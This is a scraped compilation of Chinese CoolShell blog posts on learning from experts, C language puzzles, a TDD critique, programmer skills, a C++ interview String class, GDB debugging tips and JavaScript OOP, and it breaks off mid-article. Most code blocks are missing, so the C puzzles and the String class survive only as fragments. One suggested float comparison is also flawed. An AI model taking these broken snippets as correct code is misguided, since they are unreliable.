fast有些东西你需要花很长的时间才能学会。我对自己有信心不需跳跃性的就能把一个我从没有见过的ORM框架学会，因为我以前用过相似的东西，它们在概念上是相同的。但是，如果你需要做一个把演讲转成文本的东西呢，这并不简单，因为你没有足够多的背景知识。你可以希望通过Google给你提供一些东西让你Copy/Paste，但这是一个很不好的做法，只有大学里的做研究的研究员干这种烂事。如果是要创建一个网站呢，我们都知道怎么去创建一个网站，但是有多少人会知道如何架构一个每天有一千万用户访问的网站？那么我们需要去学的就是怎么做扩容扩展， **我相信你的用户需要等你一到两个月才能把速度提上去** :)。是的，我太笨了，所有我需要做的就是去招一个专家，然后……嗯……哦等一下，我们的啤酒和三明治都不够了。
#### 为什么我应该关心**和高手在一起工作真是超爽无比** 。你也许以前经历过，他们每说的一件事总是新鲜的，总是有意思的，你能从他们每一行的代码中学到很多小技巧，你几乎可以感觉到你的大脑在不断膨胀:)。你想从高手学习，所以，如果你身边没有高手，那真是太糟糕了。因为每一个人只会去学那些“需要”被学的东西，所以没有人能教给你任何有意思的东西。然而，这些高手也总是想和高手一起工作， 所以， **你需要做的事就是确定能让高手想和你一起工作？** 。按需所学也许是一个不错的技能，但其不应该成为程序员的价值观。是的，这是一个巨大的行业你不可能学习所有的东西，所以，你需要有所选择地把其学精，只要你有足够的好奇心去跟从你的兴趣，你会发现最终你会真正掌握很多很多其它的东西。如果你能把你的工作做好，那么其它的超级牛人都会想要和你一起工作，因为他们可以从你这学到东西，而你又可以从他们那里学到东西。这样一来，所有的人都会是成功者。Image by SamueleGhilardi and SpecialKRB—————————————————正文结束分割线——————————————————我在这里想说几个我的观点：
1. 我特别同意作者的，如果你把一个技术搞精搞深，你的知识面自然会很广的。   2. 面对于各种比较深的东西（比如C++的奇技淫巧），作为一个实用主义者可能很不屑，但是你也会为此而失去开阔眼界的机会。   3. 为明天做一些技术储备，因为你不知道你所缺的东西。多多阅读，多多交流，最好能把自己的心得写下来强化自己的认识和记忆。   4. 不要只寄望于在工作中学习，工作没有覆盖的地方你就不学了。真正的高手在工作之余都会花很多时间去自己研究点东西的。   5. 永远和高手一起工作。如果你面试的公司的面试太简单了，那就不要去，因为简单的面试通常意味着平庸。去那样的公司工作只会让你的学习速度变慢，甚至倒退。   6. 很多东西在概念上是相通的，在哲学层次上是相通的，这是你需要去追求的学习知识的境界。   7. 最后echo一下作者的话——“很多时候，你缺少的不是知识而是热情”！谢谢大家又花了一点看我的唠叨。呵呵。# 语言的歧义作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn语言是人与人相互沟通的途径，而计算机语言则是人和计算机沟通的途径。就算是任何再完美的自然语言都会有歧义，但是又是什么让人和计算计算机间产生了歧义呢？   下面这篇文章来自Gowri Kumar的Puzzle C一文。我做了一些整理，挑选了其中的一些问题，并在之后配上相应的答案(这些答案是我加的，如果需要原版的答案可以直接和本文作者Gowri Kumar联系，作者的联系方式可以从这里得到)。
### puzzle 1此段程序的作者希望输出数组中的所有元素，但是他却没有得到他想要的结果，是什么让程序员和计算机产生歧义？for(d=-1;d <= (TOTAL_ELEMENTS-2);d++)     printf("%d\n",array[d+1]);return 0;     }**解答：**   运行上面的程序，结果是什么都没有输出，导致这个结果的原因是sizeof的返回值是一个unsinged int，为此在比较int d 和TOTAL_ELEMENTS两个值都被转换成了unsigned int来进行比较，这样就导致-1被转换成一个非常大的值，以至于for循环不满足条件。因此，如果程序员不能理解sizeof操作符返回的是一个unsigned int的话，就会产生类似如上的人机歧义。### puzzle 2看上去非常完美的程序，是什么导致了编程程序不通过？**解答：**   程序员要以计算机的语言进行思考，不上上面那段程序导致的结果不止是歧义这么简单，而直接的结果是，导致计算机”听不懂”你在说什么。导致计算机听不懂的原因是HP- UX中的’-‘是减号？还是其他什么？### puzzle 3
下面这段程序会输出什么，为什么？if(i < 15)     continue;     }while(false);return 0;     }**解答：**   1到14？不对，结果是1，因为continue的含义是不执行循环体之后语义，而直接到循环点。明显while(false)不属于循环体。导致这段程序的歧义就是：程序员没有完全理解计算机语言中continue的含义。### puzzle 4下面这段程序的输出结果是：当然，你首先要了解##和#的用法，如果不懂的话，本题你可以直接跳过。   **解答：**   看到这段程序你可能会认为，这两个printf输出的同一个结果，可是答案却非如此，本题的输出是12和f(1,2)，为什么会这样呢？因为这是宏，宏的解开不象函数执行，由里带外。### puzzle 5下面这段程序的输出是什么**解答：**   本题我故意将语法敏感插件去掉，为了就是能得到更好的效果，这道题又是什么让歧义再次发生，如果不仔细你可能永远都找不到答案，如果真到的到了那个时候，你是否会因为对default语义的怀疑，而不敢再使用default？本题的歧义点就是default，看好了是defau1t而不是default，不是关键字！为什么计算能”听懂”这样的defau1t，算然它听懂了，但它的理解却是标号”defau1t”
### puzzle 6下面这段程序的输出什么？for(i=0;i<10;i++)     f = f + 0.1f;if(f == 1.0f)     printf("f is 1.0 \n");     else     printf("f is NOT 1.0 \n");return 0;     }**解答：**   你是否似曾相识？不错这个问题在酷壳之前的博文《你能做对下面这些JavaScript的题吗？》中曾今提到过，不要让两个浮点数相比较。所以本题的答案是”f is NOT 1.0″，如果你真想比较两个浮点数时，你应该按一定精度来比较，比如你一定要在本题中做比较那么你应该这么做if( (f – 1.0f)<0.1 )### puzzle 7下面两个函数是否具有相同的原型？int foobar(void);     int foobar();下面这两段程序将会帮你找到上题的答案   程序1foobar1();     foobar2(33, ch);return 0;     }程序2foobar1(33,ch);     foobar2();return 0;     }**解答**   程序片段一，没有问题，程序片段二编译报错，这两个程序告诉我们，foobar1(void)和foobar2()是有不同原型的的。我们可以在《ISO/IEC 9899》的C语言规范找到下面两段关于函数声明的描述
> 10.The special case of an unnamed parameter of type void as the only item in > the list specifies that the function has no parameters> 14.An identifier list declares only the identifiers of the parameters of the > function. An empty list in a function declarator that is part of a > definition of that function specifies that the function has no parameters. > The empty list in a function declarator that is not part of a definition of > that function specifies that no information about the number or types of the > parameters is supplied.124)
上面两段话的意思就是：foobar1(void)是没有参数，而foobar1()等于forbar1(…)等于参数类型未知。**总结**   看到这些C语言的题目，不禁让我想起了巴别塔，计算机语言作为如此严谨的语言都有可能带来如此多的歧义，更何况自然语言，更何况相互不通的自然语言。要杜绝歧义，我们就必须清晰的了解计算机语言每一个指令的语义。就如同人类，人类要和平就要相互了解各自的文化。愿世界上人们清晰了解别人的语言的语义，愿世界不再因为文化的不同而战争，原世界和平。# WebTTY！太酷了！作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这真是一件很Cool的事，在Web上操作Linux，请访问下面这个链接：于是你会看到页面中间的红色，一个小操作系统启动了，红色的最下方是一个bash-2.05b#试着输入一下命令吧。bash-2.05b# uname -a   Linux (none) 2.6.18 #2 Mon Dec 29 19:47:06 UTC 2008 i686 GNU/Linux命令支持的不多，好像只是一个单机版的虚拟机，一但你打开网页时就起动一个。当然，也不排除其完全是假的，因为太简单了，一切都可以fake出来。
# [转]TDD到底美还是不美？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**下面的文章转自Todd Wei 的《TDD到底美还是不美？》，对于这篇文章，我个人能过透过作者的观点感受到他的项目中使用TDD的难点，同样可以感受到作者内心的纠结。不管怎么样，我能够感到作者Todd Wei在独立思考，独立思考总是好的，因为那是走向成熟的必要条件。(另，大家可以移步过去看看相关的评论，挺有意思的)**————————————————————————————————————最近CoolShell上的一篇《TDD并不是看上去的那么美》引起了敏捷社区的高度关注和激励辩论。今天，InfoQ甚至专门举行了一个“虚拟座谈会”《TDD有多美？》，几位国内敏捷社区的名人专门就此问题展开了深入地讨论。不论结果如何，这个纯技术的探讨精神还是非常值得赞赏的。事件实际上可以简单地归纳为“一个有一定影响力的开发人员质疑TDD，一群敏捷社区名人对TDD进行解释和辩护”。现在，就让我坚定地站在CoolShell一边，为对TDD的质疑和批判添砖加瓦吧！TDD的核心理念是什么呢？第一是Specification by Example，即把测试用例作为表达需求的一种方式。传统的需求表达方式包括文档，Use Case等，而TDD强调通过测试用例来表达需求。另外，TDD的测试用例是黑盒的基于外部接口的，所以，它实际上又是对外部接口的设计。如何看待测试用例是TDD与传统测试的一个重要区别。“不把测试用例单纯地视为测试，而从需求和设计的角度来看测试用例”的理念本身是好的。另外，TDD的第二个理念是Test First，强调测试对于实现的驱动作用，先写测试用例，再实现和重构。在Specification by Example的理念下，Test First的实质是“先理解清楚需求，并做好外部接口设计，把它转化为测试用例，然后再来实现和重构”。
我认为，Specification by Example是不错的，因为测试用例作具有精确性，容易自动化的优点，这是传统的文档和Use Case在表达需求时所欠缺的地方。但 **Test First理念本身则有很大的问题** ，尤其“在没有测试用例失败之前，不要写任何一行代码”的极端方式则更是极端的错误。如果测试用例是需求和设计，那么为什么不能先写出测试用例（即理解清楚需求做好外部接口设计）再来实现呢？这不是我们最熟悉的先需求再设计再编码吗？答案是： **不能执行的测试用例（Test First）和能执行的测试用例有着天壤之别** 。不能执行的测试用例和写在纸上的文档相比对实现的指导意义不见得能好到哪里去！除非是一些很简单的情况下，在实际的软件开发中，你很难在没有执行测试用例的情况下写出真正符合最终需求的测试用例来。比如：你做一个页面，页面的效果需求和设计通常会在真正可以运行之后不断调整。如果片面强调测试对实现的驱动作用，那么实际上隐含了“需求可以在实现之前固定下来”的假设，这是非常不敏捷的和不现实的！我认为要做到真正的敏捷必须承认 **“需求无法在用户真正能运行看到效果之前明确下来“** 。由此可见，Test First和瀑布式思想没有区别，都强调需求先于实现，而忽略了软件需求的产生是一个在实际运行中不断调整探索完善的过程。TDD无非是把需求分析的结果用测试用例表达，替代传统用文档表达需求，但从宏观上看，TDD和瀑布比是换汤不换药。除了简单情况，不存在脱离实现的需求，你能够在明确了需求之后就实现出一套linux系统吗？既然你根本无法实现一套linux系统，那么这样所谓的需求又有多大的意义呢？所以，能提出什么样的需求不能脱离你的实现能力。 **需求和实现之间不是简单的谁驱动谁，而是一种相互反馈的关系** ，这与需求用什么方式表达没有关系。到目前为主，我推崇的方式是快速实现，在实际运行中体验效果，不断优化探索和明确需求，当需求达到一个比较稳定的程度才编写测试用例将需求固化下来。
上面的论述主要针对贴近用户的外部需求（如ATDD），下面我会进一步解释即使是在内部的单元测试级别TDD仍然有问题。我们还是首先从需求入手，思考一下单元的需求是哪里来的呢？答案是：需求来自于设计， 也就是说高层模块的内部设计产生了低层模块的需求。而这种内部设计具有很大的不稳定性，带有很多假设的成分，在没有进行集成测试的情况下，很难讲这种内部设计是否合理。实际项目开发通常会在集成运行之后不断调整内部的设计，即影响单元的需求。那么，如果是按测试驱动，首先按不成熟的内部设计把一个个单元需求编写成单元测试再来实现，实际上大大推迟了能进行集成测试的时间， 对于真正快速弄清需求稳定设计反而是不利的。假设最终还是所有单元都完成，然后开始运行集成或验收测试，这时候有两种可能：1.用户看到实际效果，决定调整需求；2.发现未集成前的很多假设不成立。不论是哪一种情况发生，以前所写的单元测试都面临着被废弃或必须修改的命运。实际上，多数与业务相关的单元测试用例比起集成或验收测试用例更加不稳定，因为它会受到所有其上层模块的需求和设计变动的影响。由于我们在不稳定的单元测试上浪费了大量的时间（按我的经验编写单元测试比编写实现更耗时），这就导致了迟迟无法进行集成看到实际效果，也没有办法敏捷地应对需求的调整。也就是说具有讽刺意味的， **Test First理念居然是和敏捷理念矛盾的！**
所以，我认为TDD的理念Specification by Example没错，但Test First即“在实现之前把需求和外部接口设计转化成测试用例”的理念错了。真正符合实际开发情况的理念是“需求是在实际运行过程中根据效果不断探索调整得来的，不可能脱离实际运行写出真正符合最终需求的测试用例来”。所以， **我们真正应该做的是尽快看到实际运行的效果** ，而测试作为固化的需求和设计是在看到效果之后。 **过度的TDD只会导致迟迟看不到实际运行效果，看到效果需要调整需求又会废掉或改掉一大堆的测试用例。** 实际上，越是外部的需求其变更带来的影响和代价越大，越是需要尽早明确。从宏观上看， **TDD所谓的快速反馈实际上是加快内部反馈，延迟了外部反馈，这无异于本末倒置** 。而大量需要修改或作废的测试用例其实是一种很大的浪费，这和消除浪费的精益思想也是矛盾的！上面这幅cost/length_of_feedback_cycle图是我们常见的用于说明敏捷方法比传统方法具有更短的反馈周期，更小代价的应对变化。从图中我们可以清晰的看到在验收测试中发现的需求错误导致的代价是最高的。如果验收测试往后推迟一点，发现错误的代价将按非线性地增长。上面我们已经论述了，任何方法都不可能消除验收测试后对需求的调整，因为这是需求产生的正常过程。我们唯一可以做的是尽可能地缩短验收测试的反馈周期，但是很不幸TDD大量的内部测试只会导致推迟验收测试的时间，从而大大增加代价。
下面这段话来自于InfoQ文章《Mock不是测试的银弹》：“在使用JMock框架后测试编写起来更容易，运行速度更快，也更稳定，然而出乎意料的是产品质量并没有如我们所预期的随着不断添加 的测试而变得愈加健壮，虽然产品代码的单元测试覆盖率超过了80%，然而在发布前进行全面测试时，常常发现严重的功能缺陷而不得不一轮轮的修复缺陷、回归 测试。为什么编写了大量的测试还会频繁出现这些问题呢？ ”这描述的情况和我在实践中遇到的情况类似，不过很可惜文章并没有找到问题真正的原因。真正的原因不是什么Mock不Mock，而是TDD的单元测试是基于开发人员的假设，这些假设的测试即使全部通过代码覆盖率100%，到了集成测试发现假设根本不成立又怎能保证高质量？当然，我不是全盘否定TDD。TDD在某些需求特别固定的场合是适用的，尤其是与具体业务关系不大的需求，比如：写一个通用的数据结构，实现一个通用算法。TDD的先关注需求和思考外部接口设计的理念也对促进开发人员的抽象思维有很大益处。另外，TDD通常也具有较高的代码覆盖率。本文的主要观点在于：实际项目中，不要期望可以在实现之前完全明确需求，需求是在实际运行看到效果之后才逐步明确的；我们的开发过程必须能够敏捷地适应需求的变化，而TDD的Test First理念恰好与之矛盾。所以，对于TDD不了解的朋友，我建议应该学习和实践TDD，从而获得其益处；同时我也提醒TDD存在理论上的缺陷，这是在实践中需要特别留意的。
(全文完)# 未来五年程序员需要掌握的10项技能作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn由于最近经济形势的变化，很多开发人员只关注他们短期的工作前景。与此同时，把时间和精力花在学习最能带来回报的新技术上是件非常重要的事情。这里是我们列举的10种你需要马上开始学习的技术，让你的简历在未来5年不会落伍。这个列表并不完全，有很多业界的领域（比如大型机开发人员）没有涉及。尽管如此，对通常的主流开发来说，学习其中至少7项技能肯定不会错 ——不但要达到能在面试时侃侃而谈的程度，还得能在工作中运用自如。**1) 编程语言三选一 (.NET, Java, PHP)**   除非开发世界有根本的改变（类似小行星击中雷德蒙），在不远的将来，大部分开发人员将需要了解三大开发平台——.NET (VB.NET或者C#), Java, 或者PHP——中的至少一个。并且只了解核心语言也是不够的。因为项目会包含越来越多不同的功能，你需要对相关框架和库有深入的了解。（本人以为C/C++可能比这三个语言更有竞争力）**2) 互联网Rich Application (RIAs)**   不管爱她还是恨她，最近几年，Flash的用途突然间不仅仅是制作政治人物弱智歌曲演唱动画而已了。Flash也萌生出了以Flex和AIR为形式的附加功能。Flash的竞争对手，比如JavaFx和Silverlight，也在不停的在特性和性能上加筹码。HTML5集成了所有RIA的功能，包括数据库连接，而W3C正式地贴上了AJAX的标签。在不久的将来，RIA专家将会是简历的一个重要筛选条件。
**3) Web开发**   Web开发在近期内不会消失。很多开发人员满足于忽略Web或者只是使用他们的框架给他们提供的”基本元素”。但是公司需要越来越多的真正知道怎样使用底层技术进行“手工编码”的人。所以要获得成功请在未来5年里努力钻研JavaScript，CSS和HTML。**4) Web服务**   REST或者SOAP？JSON或者XML？ 尽管选项和答案取决于项目本身，不使用或者创建Web服务对一个开发人员（甚至是那些不做Web应用程序的）来说越来越困难。那些原来采用ODBC，COM或者RPC domains的领域，现在也在某种程度上过渡到了Web服务。不会用Web服务的开发人员将会发现他们被排挤或者沦为维护人员。**5) 其它软实力**   有一种已经开始了很久的趋势，IT在企业内部或者外部变得越来越透明。开发人员被卷入越来越多的非开发性会议和过程以给与反馈。举个例子，CFO要改变会计规则不能不依靠IT去更新系统。如果没有IT去升级CRM的工作流，运营经理就不能更改呼叫中心的流程。同样的，客户常常需要和开发小组一起工作来保证他们的需求被满足。每一个开发人员都需要找主持人帮助或者去学习《怎样结交朋友并影响别人》么？不是。但是拥有这种能力的开发人员对他们的雇主来说更有价值——并且更抢手。
**6) 掌握一门动态的和/或一门函数编程语言   **像Ruby，Python, F#, 和Groovy这样的语言并不很主流——但是他们包含的想法却是。比如说，微软的.NET中的LINO系统是函数编程技术的直接产物。Ruby和Python在某些部门很热门，分别感谢Rails框架和Silverlight。学习其中的一门语言不只会提升你的简历；它能开阔你的视野。我见过的每一个顶级开发人员都推荐学习至少一种动态或者函数编程语言，用来理解新的思考方式，个人经验来讲，我可以告诉你确实有用。**7）敏捷开发方法**   在敏捷开发方法刚开始进入主流视线的时候，我持怀疑态度，和其他我认识的很多家伙一样。它看起来就像某种对传统的下意识反应，丢掉控制和标准而偏爱混乱。但是随着时间的推移，敏捷开发背后的智慧被更好的定义和表达出来。很多团队不是应用了敏捷开发就是在进行敏捷开发的概念证明实验。尽管敏捷开发不是治愈项目失败的终极灵药，它的确在很多项目上有一席之地。在未来几年里，对有着敏捷开发环境的理解和成功经验的开发人员的需求将会高速增涨。**8) 相关领域知识**   和敏捷开发密切关联，开发小组在项目定义中被越来越多的看做是同伴。这意味着了解问题领域的开发人员能够用更可见的，高价值的方式给项目作出贡献。敏捷开发中，一个能够说，“从这里，我们也可以很简单的添加这项功能，而且这能给我们带来很多回报，” 或者 “噢，这个要求和我们的日志中显示的使用模式并不相符” 的人将是优胜者。正如许多开发人员有抵制了解问题领域的想法，不可否认的是越来越多的组织希望（如果不是要求）开发人员至少能理解基本的内容。
**9) 开发修养**   几年之前，很多（如果不是大部分）团队都没有使用bug跟踪系统，版本控制，和其他类似工具；只有开发人员和他们选择的IDE。但是，感谢新的整合套件的开发，比如Microsoft Visual Studio Team System以及高质量开源环境的爆炸性发展，没用到这些工具的组织变得更不常见。开发人员必须比知道怎么在代码控制中提交和获得代码或者怎样用VM系统配置测试环境了解更多的东西。他们需要在适当的地方养成严格的卫生习惯以保证他们和其他的小组恰当的合作。“代码牛仔”，把所有的东西存放在私人USB盘上，不把对任务对象的相应改变记录成文档，等等的人，在传统的团队里不受欢迎，在需要团队成员之间紧密合作的敏捷开发环境中更是如此。**10) 移动无线开发**   上世纪90年末代web开发被主流接受开始在很多领域将传统的桌面程序边缘化，在2008年，移动无线开发开始兴起，在未来5年里，它将会变得越来越重要。当然，移动开发有很多不同的方法：针对移动设备的web应用程序开发，针对市场的RIAs，和直接在设备上运行的应用程序。不管你选择了哪个方向，把移动开发加入你的技能集会保证你满足未来的需求。
# C++面试中string类的一种正确写法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友 @bnu_chenshuo 投稿）**C++ 的一个常见面试题是让你实现一个 String 类，限于时间，不可能要求具备 std::string 的功能，但至少要求能正确管理资源。具体来说：1. 能像 int 类型那样定义变量，并且支持赋值、复制。   2. 能用作函数的参数类型及返回类型。   3. 能用作标准库容器的元素类型，即 vector/list/deque 的 value_type。（用作 std::map 的 key_type 是更进一步的要求，本文从略）。换言之，你的 String 能让以下代码编译运行通过，并且没有内存方面的错误。foo(s1);     bar(s1);     foo("temporary");     bar("temporary");     String s4 = baz();std::vector<String> svec;     svec.push_back(s0);     svec.push_back(s1);     svec.push_back(baz());     svec.push_back("good job");     }
本文给出我认为适合面试的答案，强调正确性及易实现（白板上写也不会错），不强调效率。某种意义上可以说是以时间（运行快慢）换空间（代码简洁）。首先选择数据成员，最简单的 String 只有一个 char* 成员变量。好处是容易实现，坏处是某些操作的复杂度较高（例如 size() 会是线性时间）。为了面试时写代码不出错，本文设计的 String 只有一个 char* data_成员。而且规定 invariant 如下：一个 valid 的 string 对象的 data_ 保证不为 NULL，data_ 以 `'\0'` 结尾，以方便配合 C 语言的 str*() 系列函数。其次决定支持哪些操作，构造、析构、拷贝构造、赋值这几样是肯定要有的（以前合称 big three，现在叫 copy control）。如果钻得深一点，C++11的移动构造和移动赋值也可以有。为了突出重点，本文就不考虑 operator[] 之类的重载了。这样代码基本上就定型了：// Accessorsprivate:     char* data_;     };注意代码的几个要点：1. 只在构造函数里调用 new char[]，只在析构函数里调用 delete[]。   2. 赋值操作符采用了《C++编程规范》推荐的现代写法。   3. 每个函数都只有一两行代码，没有条件判断。   4. 析构函数不必检查 data_ 是否为 NULL。   5. 构造函数 `String(const char* str)` 没有检查 str 的合法性，这是一个永无止境的争论话题。这里在初始化列表里就用到了 str，因此在函数体内用 assert() 是无意义的。
这恐怕是最简洁的 String 实现了。**练习1** ：增加 operator==、operator<、operator[] 等操作符重载。**练习2** ：实现一个带 int size_; 成员的版本，以空间换时间。**练习3** ：受益于右值引用及移动语意，在 C++11 中对 String 实施直接插入排序的性能比C++98/03要高，试编程验证之。（g++的标准库也用到了此技术。）陈皓注：同时，大家可以移步看看我的一篇老文《STL中String类的问题》# GDB中应该知道的几个调试方法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn七、八年前写过一篇《用GDB调试程序》，于是，从那以后，很多朋友在MSN上以及给我发邮件询问我关于GDB的问题，一直到今天，还有人在问GDB的相关问题。这么多年来，有一些问题是大家反复在问的，一方面，我觉得我以前的文章可能没有说清楚，另一方面，我觉得大家常问的问题正是最有用的，所以，在这里罗列出来。希望大家补充。目录* 一、多线程调试   * 二、调试宏   * 三、源文件   * 四、条件断点   * 五、命令行参数   * 六、gdb的变量   * 七、x命令   * 八、command命令
#### 一、多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令：* info thread 查看当前进程的线程。   * thread <ID> 切换调试的线程为指定ID的线程。   * break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。   * set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。      * off 不锁定任何线程，也就是所有线程都执行，这是默认值。     * on 只有当前被调试程序会执行。     * step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。#### 二、调试宏这个问题超多。在GDB下，我们无法print宏定义，因为宏是预编译的。但是我们还是有办法来调试宏，这个需要GCC的配合。在GCC编译程序的时候，加上 **-ggdb3** 参数，这样，你就可以调试宏了。
另外，你可以使用下述的GDB的宏调试命令 来查看相关的宏。* info macro – 你可以查看这个宏在哪些文件里被引用了，以及宏定义是什么样的。   * macro – 你可以查看宏展开的样子。#### 三、源文件这个问题问的也是很多的，太多的朋友都说找不到源文件。在这里我想提醒大家做下面的检查：1. 编译程序员是否加上了-g参数以包含debug信息。   2. 路径是否设置正确了。使用GDB的directory命令来设置源文件的目录。下面给一个调试/bin/ls的示例（ubuntu下）#### 四、条件断点条件断点是语法是：break [where] if [condition]，这种断点真是非常管用。尤其是在一个循环或递归中，或是要监视某个变量。注意，这个设置是在GDB中的，只不过每经过那个断点时GDB会帮你检查一下条件是否满足。#### 五、命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法：1. gdb命令行的 –args 参数   2. gdb环境中 set args命令。#### 六、gdb的变量有时候，在调试程序时，我们不单单只是查看运行时的变量，我们还可以直接设置程序中的变量，以模拟一些很难在测试中出现的情况，比较一些出错，或是switch的分支语句。使用set命令可以修改程序中的变量。
另外，你知道gdb中也可以有变量吗？就像shell一样，gdb中的变量以$开头，比如你想打印一个数组中的个个元素，你可以这样：(gdb) set $i = 0(gdb) p a[$i++]...  #然后就一路回车下去了当然，这里只是给一个示例，表示程序的变量和gdb的变量是可以交互的。#### 七、x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。* x/x 以十六进制输出   * x/d 以十进制输出   * x/c 以单字符输出   * x/i 反汇编 – 通常，我们会使用 `x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器）`   * x/s 以字符串输出#### 八、command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例：(gdb) break func     Breakpoint 1 at 0x3475678: file test.c, line 12.     (gdb) command 1     Type commands for when breakpoint 1 is hit, one per line.     End with a line saying just "end".     >print arg1     >print arg2     >print arg3     >end     (gdb)
当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。（全文完）# 千万别惹程序员作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn酷壳好久没有发娱乐性质的技术文章了，搞得气氛有点严肃了，考虑到程序员们都是比较严肃和容易较真的类书呆子的群体，所以，需要更新一个有娱乐性质的文章了。正好最近看到了两个比较有趣的图，在新浪微博上都得到了比较不错的反响，因此，更新到酷壳上来。#### 如果编程语言是一种刀下面这个图是把编程语言看做是一种刀，那么会是什么样的。这个图我个人感觉很有意思。对于这个图，最好不要解释，意会就好。不过，我却有点想不解风情，忍不住想解释一下。* C++，C，Pascal 都是瑞士军刀，说明是用来做细活的工具。C语言的刀上有个USB，说明是可以做硬件操作的。C++的刀是什么都有，说明C++是一种功能繁多的语言。（图中C++的那把瑞士军刀很强大，不要以为其是虚构的，这把刀是真实存在的，叫Wenger巨人刀， (这个网页上有个Youtube视频，可以爬墙去看)，淘宝上有卖的，价格在1万4左右。）   * Java/C#是一把塑料餐刀，这说明，Java和C#语言是带虚拟机的，而且其语法和使用并不像C++那么复杂，其泛型编程可以有很多种玩法，而Java和C#的泛型编程是比较单一的。   * Python是把电锯，人挡杀人，佛招杀佛，威力很大，面对大型的物体的修整，比C++/C/Java什么的得心应手得多得多，但是对于一些精细的调优工作，明显不行。这和Ruby很像。   * PHP没有MySQL，明显是被幽默了一把。不过最近对PHP的批评越来越多，不过，facebook的PHP的引擎HiPo已经很牛B了。   * Perl是一本日本武士刀，是忍者玩的语言。   * VB，就是一个玩具。你见过用塑料玩具勺当刀的吗？Haskell感觉是外星来的。呵呵
#### 千万别惹程序员下图一张昨天我公司内部被传递的图片。经典的SQL注入式攻击。千万别惹程序员这是一个有技术含量的号牌遮挡。我们先不说其是不是能奏效，不过，这个创意相当的NB啊。当你驾车通过某些路口时，被摄像头捕捉到你的车牌，通过OCR变成文本，然后插入数据库，于是，上图的这个车牌就成了SQL注入。（不要以为车牌的OCR技术还不行，这项目技术已经非常成熟了，无论是国内还是国外）。这张图片就如同“Web开发中应该知道的事”中说的一样——永远不要相信用户的输入。**插曲** ：我昨天把这张图片放到微博，结果， **被转了几万次，上了热门转发的top list和一些社会热点和明星八卦排在了一起** 。主要是被“ _@微博搞笑排行榜: @全球潮流趣闻: @实用小百科: @经典英文语录: @当时我就泪奔了: @老榕: @全球经典音乐: @环球汽车搜罗: @怪诞心理行为学: @精彩电影: @互联网的那点事: @潮混搭: @热门微博: @SinaAppEngine:_ ” 还有些什么体育记者，法律记者都转了， 这些转发了。这多少让我觉得有些诧异，这是很技术的一件事啊，怎么连什么电影，英文对白，汽车，音乐什么的都转了？我是相当的费解啊，我只能有两个认为——
1. 简单的认为关心技术的人还是很多的。   2. 复杂地认为国人是喜欢起哄的，不问为什么。（全文完）# 再谈javascript面向对象编程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**前言:** 虽有陈皓《Javascript 面向对象编程》珠玉在前，但是我还是忍不住再画蛇添足的补上一篇文章，主要是因为javascript这门语言魅力。另外这篇文章是一篇入门文章，我也是才开始学习Javascript，有一点心得，才想写一篇这样文章，文章中难免有错误的地方，还请各位不吝吐槽指正目录* 吐槽Javascript   * __proto__成员   * 函数对象prototype成员   * new 操作符   * Pseudoclassical 继承   * Prototypal继承   * 参考:   * 题外话：#### **吐槽Javascript**初次接触Javascript，这门语言的确会让很多正规军感到诸多的不适，这种不适来自于Javascript的语法的简练和不严谨，这种不适也来自Javascript这个悲催的名称，我在想网景公司的Javascript设计者在给他起名称那天一定是脑壳进水了,让Javascript这么多年来受了这么多不白之冤，人们都认为他是Java的附属物，一个WEB玩具语言。因此才会有些人会对Javascript不屑，认为Javascript不是一门真正的语言，但是这此他们真的错了。Javascript不仅是一门语言，是一门真真正正的语言，而且他还是一门里程碑式的语言，他独创多种新的编程模式原型继承，闭包（ **作者注：闭包不是JS首创，应该Scheme首创，prototypal inheritance 和 dynamic objects 是self语言首创，Javascript的首创并不精彩,谢谢网友的指正。** ），对后来的动态语言产生了巨大的影响。做为当今最流行的语言（没有之一），看看git上提交的最多的语言类型就能明白。随着HTML5的登场，浏览器将在个人电脑上将大显身手，完全有替换OS的趋势的时候，Javascript做为浏览器上的一门唯一真真的语言，如同C之于 unix/linux，java之于JVM，Cobol之于MainFrame，我们也需要来重新的认真地认识和审视这门语言。另外Javascript的正式名称是：ECMAScript，这个名字明显比Javascript帅太多了！
言归正传，我们切入主题——Javascript的面向对象编程。要谈Javascript的面向对象编程，我们第一步要做的事情就是忘记我们所学的面向对象编程。传统C++或Java的面向对象思维来学习Javascript的面向对象会给你带来不少困惑，让我们先忘记我们所学的，从新开始学习这门特殊的面向对象编程。既然是OO编程，要如何来理解OO编程呢，记得以前学C++，学了很久都不入门，后来有幸读了《Inside The C++ Object Model》这本大作，顿时豁然开朗，因此本文也将以对象模型的方式来探讨的Javascript的OO编程。因为Javascript 对象模型的特殊性，所以使得Javascript的继承和传统的继承非常不一样，同时也因为Javascript里面没有类，这意味着Javascript里面没有extends,implements。那么Javascript到底是如何来实现OO编程的呢？好吧，让我们开始吧，一起在Javascript的OO世界里来一次漫游首先，我们需要先看看Javascript如何定义一个对象。下面是我们的一个对象定义：还可以这样定义一个对象对，你们没有看错，在Javascript里面，函数也是对象。   当然还可以
